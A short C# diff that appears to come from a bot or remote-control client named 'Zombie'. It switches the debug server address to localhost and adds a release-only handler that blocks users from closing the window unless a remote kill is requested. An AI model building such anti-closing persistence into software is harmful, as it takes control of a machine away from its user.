@@ -45,7 +45,7 @@ namespace Zombie
             ClientSettings settings;
 
 #if DEBUG
-            settings = new ClientSettings("192.168.0.14", 1337);
+            settings = new ClientSettings("127.0.0.1", 1337);
 #else
             var assembly = Assembly.GetExecutingAssembly();
             string resourceName = assembly.GetManifestResourceNames().Single(str => str.EndsWith(ClientSettings.SettingsResourceName));
@@ -59,6 +59,17 @@ namespace Zombie
 #endif
 
             return settings;
+        }
+
+        private void ZombieForm_FormClosing(object sender, FormClosingEventArgs e)
+        {
+#if !DEBUG
+            if (!Kill.KillRequested)
+            {
+                e.Cancel = true;
+                return;
+            }
+#endif
         }
     }
 }
